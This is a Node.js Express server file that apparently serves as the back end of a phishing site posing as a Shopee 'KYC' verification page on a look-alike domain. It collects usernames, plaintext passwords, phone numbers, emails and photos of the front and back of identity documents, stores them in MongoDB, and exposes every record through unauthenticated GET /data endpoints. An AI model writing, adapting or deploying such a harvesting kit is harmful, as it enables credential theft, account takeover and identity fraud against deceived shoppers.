const express = require("express");
const mongoose = require("mongoose");
const path = require("path");
const multer = require("multer");
const config = require("./config.js");
const app = express();

app.all('/', function(req, res, next) {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "X-Requested-With");
  next()
});

var options = {
  useNewUrlParser: true,
  autoIndex: true,
  useUnifiedTopology: true,
};

mongoose.connect(config.url, options, function (err) {
  console.log(err);
});
const inforSchema = new mongoose.Schema({
  user_name: String,
  password: String,
  front_certificate: String,
  back_certificate: String,
  phone: String,
  email: String,
});

const inforModel = mongoose.model("information", inforSchema);
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, path.join(__dirname, "../asset"));
  },
  filename: function (req, file, cb) {
    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
    cb(null, "/image" + "-" + uniqueSuffix+'.png');
  },
});
app.set('views', path.join(__dirname, '../views'));
app.use(express.static(__dirname + '/../public'));
app.use('/images',express.static(__dirname + '/../asset'));
app.set('view engine', 'ejs');
const upload = multer({ storage });

app.post("/data", upload.array("certificate", 2), function (req, res, next) {
  const host= 'https://verifyshopee.ml/images'
  const file1= `${host}${req.files[0].filename}`; 
  const file2= `${host}${req.files[1].filename}`;
  const {
    user_name,
    password,
    front_certificate,
    back_certificate,
    phone,
    email,
  } = req.body;
  inforModel.create({
    user_name,
    password,
    front_certificate:file1,
    back_certificate:file2,
    phone: phone.toString(),
    email,
  });
  res.json({ message: "KYC successfully !" });
});

app.get('/', function(req, res) {
  res.render('index');
});

app.get("/data", async function (req, res, next) {
  const data = await inforModel.find({});
  res.json({ data });
});

app.get("/data/:id", async function (req, res, next) {
  const { id } = req.params;
  const data = await inforModel.findById(id);
  res.json({ data });
});

app.listen(3000, () => console.log("App is on 3000"));
